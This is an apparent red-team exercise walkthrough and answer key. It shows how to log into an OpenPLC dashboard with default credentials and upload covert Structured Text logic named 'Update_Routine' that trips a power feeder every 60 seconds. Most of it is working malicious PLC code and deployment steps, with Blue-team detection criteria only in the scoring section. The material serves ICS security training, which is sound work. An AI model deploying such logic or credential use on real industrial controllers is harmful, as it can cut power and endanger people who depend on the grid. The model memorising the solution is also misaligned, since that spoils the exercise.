# Red Team Walkthrough: Hidden Load-Shed Timer

## Objective
Your goal is to modify the running PLC logic (T0889) to periodically trip `FEEDER_3_CMD` without permanently altering the normal visible operations of the other feeders.

## Scoring Logic
* **RED scores** when `FEEDER_3_CMD` trips due to the timer firing (60-second cycle).
* **BLUE scores** by correctly identifying the logic block, affected coil, download source/timestamp, and the SHA-256 hash mismatch.

---

## Step-by-Step Execution (Solution)

### Step 1: Reconnaissance
1. Navigate to the target OpenPLC Web Dashboard in your browser at `http://<TARGET_IP>:8080`.
2. Log in using default engineering credentials:
   * **Username**: `openplc`
   * **Password**: `openplc`

### Step 2: Logic Development & Baseline Deployment
1. Create your own baseline program named `baseline.st` (you can base it on the template in `engineering_baseline/baseline.st`) to configure the three critical feeders. Define the variables and force `FEEDER_1_CMD` (`%QX0.0`), `FEEDER_2_CMD` (`%QX0.1`), and `FEEDER_3_CMD` (`%QX0.2`) to `TRUE`:
   ```pascal
   PROGRAM baseline
     VAR
       FEEDER_1_CMD AT %QX0.0 : BOOL := TRUE;
       FEEDER_2_CMD AT %QX0.1 : BOOL := TRUE;
       FEEDER_3_CMD AT %QX0.2 : BOOL := TRUE;
     END_VAR
     FEEDER_1_CMD := TRUE;
     FEEDER_2_CMD := TRUE;
     FEEDER_3_CMD := TRUE;
   END_PROGRAM

   CONFIGURATION Config0
     RESOURCE Res0 ON PLC
       TASK TaskMain(INTERVAL := T#20ms, PRIORITY := 0);
       PROGRAM Inst0 WITH TaskMain : baseline;
     END_RESOURCE
   END_CONFIGURATION
   ```
2. In the OpenPLC Web UI, navigate to the **Programs** tab in the sidebar.
3. Select **Upload Program**, choose your `baseline.st` file, and upload it.
4. Once uploaded, click **Launch** or **Go to Dashboard** to trigger compilation and start the runtime in a clean state.
5. Create a new Structured Text file named `malicious.st` by modifying the baseline logic to implement the hidden timer. Keep the strict compilation rule of standard **IEC 61131-3** syntax in mind: located variables (the physical outputs declared with `AT`) **must not** share the same `VAR` block with unlocated variables (the internal timer and reset variables).
6. Save the following Structured Text payload as `malicious.st`:
   ```pascal
   PROGRAM malicious
     VAR
       FEEDER_1_CMD AT %QX0.0 : BOOL := TRUE;
       FEEDER_2_CMD AT %QX0.1 : BOOL := TRUE;
       FEEDER_3_CMD AT %QX0.2 : BOOL := TRUE;
     END_VAR
     VAR
       Malicious_Timer : TON;
       Timer_Reset : BOOL := FALSE;
     END_VAR

     FEEDER_1_CMD := TRUE;
     FEEDER_2_CMD := TRUE;
     Malicious_Timer(IN := NOT Timer_Reset, PT := T#60s);

     IF Malicious_Timer.Q THEN
         FEEDER_3_CMD := FALSE;
         Timer_Reset := TRUE;
     ELSE
         FEEDER_3_CMD := TRUE;
         Timer_Reset := FALSE;
     END_IF;
   END_PROGRAM

   CONFIGURATION Config0
     RESOURCE Res0 ON PLC
       TASK TaskMain(INTERVAL := T#20ms, PRIORITY := 0);
       PROGRAM Inst0 WITH TaskMain : malicious;
     END_RESOURCE
   END_CONFIGURATION
   ```

### Step 3: Modifying the Program (Deploying the Payload)
1. In the OpenPLC Web UI, navigate to the **Programs** tab in the sidebar.
2. Select **Upload Program**.
3. Choose your newly created `malicious.st` file.
4. Name the program `Update_Routine` to blend in, and click **Upload**.
5. Once uploaded, click **Launch** or **Go to Dashboard** to trigger the Structured Text compiler. OpenPLC will compile the code to C++, link the binary, and restart the runtime background server automatically. Verify the compilation console output prints `Compilation successful!`.

### Step 4: Verification
1. Go to the **Dashboard** or **Monitoring** tab.
2. Observe `FEEDER_3_CMD` (Address `%QX0.2`). It will read `TRUE` (online) for 60 seconds.
3. At the 60-second mark, it will momentarily trip to `FALSE` (shedding load) for a single PLC scan cycle before auto-resetting.
4. Once this trip occurs, the scoring is triggered and the Red Team objective is complete.